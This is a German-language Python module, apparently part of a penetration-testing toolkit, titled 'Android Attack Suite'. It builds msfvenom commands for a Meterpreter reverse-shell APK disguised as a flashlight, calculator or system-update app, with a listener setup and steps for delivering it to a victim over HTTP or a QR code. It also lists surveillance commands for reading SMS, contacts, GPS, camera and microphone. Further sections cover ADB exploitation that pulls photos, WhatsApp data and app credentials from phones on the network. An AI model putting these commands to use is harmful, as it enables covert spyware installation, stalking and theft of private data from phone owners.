"""
Android Attack Suite — Angriffe auf Android-Geräte.

Android ist deutlich angreifbarer als iOS:
  - APK-Sideloading ohne Jailbreak (einfach aktivieren)
  - ADB (Android Debug Bridge) über USB + Netzwerk
  - Metasploit-Payloads als APK
  - Stagefright / MediaServer Exploits (ältere Versionen)
  - drozer — Android Security Assessment Framework
"""

from __future__ import annotations
from typing import AsyncGenerator
import os


# ── APK Payload via Metasploit ────────────────────────────────────────────────

def generate_apk_payload(
    lhost: str = "192.168.1.100",
    lport: int = 4444,
    output: str = "~/penkit-output/update.apk",
    icon_disguise: str = "flashlight",  # flashlight | calculator | gallery
) -> list[str]:
    """
    Meterpreter APK — Android-RAT als gefälschte App.
    Benötigt: Opfer aktiviert 'Unbekannte Quellen' oder installiert per ADB.
    """
    disguise_names = {
        "flashlight": "Taschenlampe Pro",
        "calculator": "Taschenrechner Plus",
        "gallery": "Galerie HD",
        "update": "Systemupdate v2.1",
    }
    app_name = disguise_names.get(icon_disguise, "SystemApp")

    return [
        "# ── Schritt 1: APK generieren ──────────────────────────────",
        f"msfvenom -p android/meterpreter/reverse_https \\",
        f"  LHOST={lhost} LPORT={lport} \\",
        f"  R > {output}",
        "",
        "# ── Schritt 2: APK signieren (nötig für Installation) ──────",
        "apt install apktool apksigner",
        f"apksigner sign --ks ~/.android/debug.keystore {output}",
        "",
        "# ── Schritt 3: App-Name ändern (Social Engineering) ─────────",
        "apt install aapt2",
        f"# App heißt dann: {app_name}",
        "",
        "# ── Schritt 4: Multi/handler starten ────────────────────────",
        "msfconsole -q -x \"",
        "  use exploit/multi/handler",
        "  set payload android/meterpreter/reverse_https",
        f"  set LHOST {lhost}",
        f"  set LPORT {lport}",
        "  set ExitOnSession false",
        "  exploit -j",
        "\"",
        "",
        "# ── Schritt 5: APK verteilen ─────────────────────────────────",
        "# Option A: HTTP-Server",
        f"python3 -m http.server 8888 --directory $(dirname {output})",
        f"# Opfer öffnet: http://{lhost}:8888/update.apk",
        "",
        "# Option B: QR-Code",
        f"python3 -c \"import qrcode; qrcode.make('http://{lhost}:8888/update.apk').save('/tmp/qr_apk.png')\"",
        "eog /tmp/qr_apk.png",
    ]


async def show_apk_wizard(
    lhost: str = "192.168.1.100",
    lport: int = 4444,
) -> AsyncGenerator[str, None]:
    yield "\033[1;36m[*] Android Meterpreter APK\033[0m"
    yield f"\033[90m    LHOST: {lhost}  LPORT: {lport}\033[0m\n"

    for cmd in generate_apk_payload(lhost, lport):
        if cmd.startswith("#"):
            yield f"\033[90m  {cmd}\033[0m"
        elif cmd:
            yield f"\033[36m  {cmd}\033[0m"
        else:
            yield ""

    yield "\n\033[33m[Nach Verbindung — Meterpreter Commands]\033[0m"
    yield "\033[36m  dump_sms          — alle SMS lesen\033[0m"
    yield "\033[36m  dump_contacts     — Kontaktliste\033[0m"
    yield "\033[36m  geolocate         — GPS-Position\033[0m"
    yield "\033[36m  webcam_snap       — Foto mit Front-/Rückkamera\033[0m"
    yield "\033[36m  record_mic        — Mikrofon aufnehmen\033[0m"
    yield "\033[36m  dump_calllog      — Anrufliste\033[0m"
    yield "\033[36m  wlan_geolocate    — WLAN-basierter Standort\033[0m"


# ── ADB Exploitation ──────────────────────────────────────────────────────────

async def adb_exploitation() -> AsyncGenerator[str, None]:
    """
    ADB (Android Debug Bridge) — Developer-Mode muss AN sein.
    Über USB oder Netzwerk (Port 5555).
    """
    yield "\033[1;36m[*] ADB — Android Debug Bridge Exploitation\033[0m"
    yield "\033[90m    Voraussetzung: USB-Debugging aktiviert (Entwickleroptionen)\033[0m\n"

    yield "\033[33m[Installation]\033[0m"
    yield "\033[36m  apt install adb\033[0m\n"

    yield "\033[33m[USB-Verbindung]\033[0m"
    yield "\033[36m  adb devices              # Verbundene Geräte\033[0m"
    yield "\033[36m  adb shell                # Shell öffnen\033[0m"
    yield "\033[36m  adb pull /sdcard/ ~/android_dump/  # Dateien ziehen\033[0m\n"

    yield "\033[33m[Netzwerk-ADB (Port 5555) — kein USB nötig]\033[0m"
    yield "\033[36m  # Gerät im selben Netz mit ADB über TCP:\033[0m"
    yield "\033[36m  nmap -p 5555 192.168.1.0/24 --open\033[0m"
    yield "\033[36m  adb connect 192.168.1.50:5555\033[0m"
    yield "\033[36m  adb shell\033[0m\n"

    yield "\033[33m[Daten exfiltrieren]\033[0m"
    yield "\033[36m  adb pull /sdcard/DCIM/     # Fotos\033[0m"
    yield "\033[36m  adb pull /sdcard/Download/ # Downloads\033[0m"
    yield "\033[36m  adb pull /sdcard/WhatsApp/ # WhatsApp (Medien, Backups)\033[0m"
    yield "\033[36m  adb backup -all -apk -shared -f backup.ab  # Vollbackup\033[0m\n"

    yield "\033[33m[APK installieren via ADB]\033[0m"
    yield "\033[36m  adb install ~/penkit-output/update.apk\033[0m"
    yield "\033[36m  # Kein 'Unbekannte Quellen' nötig!\033[0m\n"

    yield "\033[33m[Credentials aus App-Daten]\033[0m"
    yield "\033[36m  adb shell run-as com.example.app cat /data/data/com.example.app/shared_prefs/*.xml\033[0m"
    yield "\033[36m  # WhatsApp-Key:\033[0m"
    yield "\033[36m  adb shell 'su -c cp /data/data/com.whatsapp/files/key /sdcard/'  # root nötig\033[0m\n"

    yield "\033[33m[Screen Capture]\033[0m"
    yield "\033[36m  adb shell screencap /sdcard/screen.png && adb pull /sdcard/screen.png\033[0m"
    yield "\033[36m  adb shell screenrecord /sdcard/video.mp4 && adb pull /sdcard/video.mp4\033[0m\n"

    yield "\033[33m[SMS/Anrufe lesen]\033[0m"
    yield "\033[36m  adb shell content query --uri content://sms/inbox\033[0m"
    yield "\033[36m  adb shell content query --uri content://call_log/calls\033[0m"


# ── drozer Framework ──────────────────────────────────────────────────────────

async def drozer_guide() -> AsyncGenerator[str, None]:
    """drozer — Android Security Assessment. Testet App-Permissions + Content Providers."""
    yield "\033[1;36m[*] drozer — Android Security Framework\033[0m"
    yield "\033[90m    Analysiert Android-Apps auf Schwachstellen\033[0m\n"

    yield "\033[33m[Installation]\033[0m"
    yield "\033[36m  pip3 install drozer\033[0m"
    yield "\033[36m  # Agent auf Gerät: drozer-agent.apk installieren\033[0m"
    yield "\033[36m  adb install drozer-agent.apk\033[0m\n"

    yield "\033[33m[Verbinden]\033[0m"
    yield "\033[36m  adb forward tcp:31415 tcp:31415\033[0m"
    yield "\033[36m  drozer console connect\033[0m\n"

    yield "\033[33m[Wichtige Commands]\033[0m"
    yield "\033[36m  run app.package.list -f banking       # Banking-Apps finden\033[0m"
    yield "\033[36m  run app.package.info -a com.example   # App-Info\033[0m"
    yield "\033[36m  run app.package.attacksurface com.example  # Angriffsfläche\033[0m"
    yield "\033[36m  run app.activity.start --component com.example .MainActivity\033[0m"
    yield "\033[36m  run app.provider.query content://com.example.provider/  # Content Provider\033[0m"
    yield "\033[36m  run scanner.provider.injection -a com.example  # SQL-Injection in Providern\033[0m\n"

    yield "\033[33m[Häufige Schwachstellen]\033[0m"
    yield "\033[36m  - Exported Activities ohne Permission (direkter Zugriff)\033[0m"
    yield "\033[36m  - Content Provider ohne Authentifizierung\033[0m"
    yield "\033[36m  - Broadcast Receiver für sensitive Events offen\033[0m"
    yield "\033[36m  - Unverschlüsselte SQLite-Datenbanken\033[0m"
    yield "\033[36m  - Klartextpasswörter in SharedPreferences\033[0m"


# ── Android Forensik ──────────────────────────────────────────────────────────

async def android_forensics() -> AsyncGenerator[str, None]:
    yield "\033[1;36m[*] Android Forensik\033[0m\n"

    yield "\033[33m[ALEAPP — Android Log Events And Protobuf Parser]\033[0m"
    yield "\033[36m  pip3 install aleapp\033[0m"
    yield "\033[36m  # Backup analysieren:\033[0m"
    yield "\033[36m  aleapp -t ab -i backup.ab -o ~/aleapp_report/\033[0m\n"

    yield "\033[33m[Cellebrite-ähnlich: androidqf]\033[0m"
    yield "\033[36m  git clone https://github.com/mvt-project/androidqf\033[0m"
    yield "\033[36m  ./androidqf  # Automatische Erfassung via ADB\033[0m\n"

    yield "\033[33m[SQLite-Datenbanken ziehen und lesen]\033[0m"
    yield "\033[36m  adb shell 'su -c find /data/data -name \"*.db\"'\033[0m"
    yield "\033[36m  adb pull /data/data/com.whatsapp/databases/msgstore.db .\033[0m"
    yield "\033[36m  sqlitebrowser msgstore.db  # WhatsApp-Nachrichten\033[0m"


# ── Übersicht ─────────────────────────────────────────────────────────────────

async def show_android_overview() -> AsyncGenerator[str, None]:
    yield "\033[1;36m╔══════════════════════════════════════════════════╗\033[0m"
    yield "\033[1;36m║         Android Attack Suite — Übersicht         ║\033[0m"
    yield "\033[1;36m╚══════════════════════════════════════════════════╝\033[0m"
    yield ""
    yield "  \033[33m[1]\033[0m Meterpreter APK Wizard    — Android-RAT generieren + verteilen"
    yield "  \033[33m[2]\033[0m ADB Exploitation          — USB-Debugging + Netzwerk-ADB"
    yield "  \033[33m[3]\033[0m drozer Framework          — App-Schwachstellen scannen"
    yield "  \033[33m[4]\033[0m Android Forensik          — ALEAPP, SQLite, androidqf"
    yield ""
